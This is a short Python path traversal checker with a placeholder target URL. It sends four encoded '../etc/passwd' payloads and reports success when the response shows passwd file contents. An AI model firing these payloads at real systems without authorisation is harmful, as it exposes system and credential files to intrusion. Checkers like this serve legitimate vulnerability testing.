import requests
import sys

# Target Configuration
TARGET_URL = "{{TARGET}}"

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

def check_vulnerability():
    print(f"[*] Testing {TARGET_URL} for path traversal (CWE-22)")

    for payload in PAYLOADS:
        try:
            resp = requests.get(f"{TARGET_URL}{payload}", timeout=10)
            if "root:" in resp.text or "nobody:" in resp.text:
                print(f"[+] SUCCESS: Path traversal confirmed with payload: {payload}")
                return True
        except Exception as e:
            print(f"[-] Request failed: {e}")

    print("[-] No path traversal detected.")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_vulnerability() else 1)
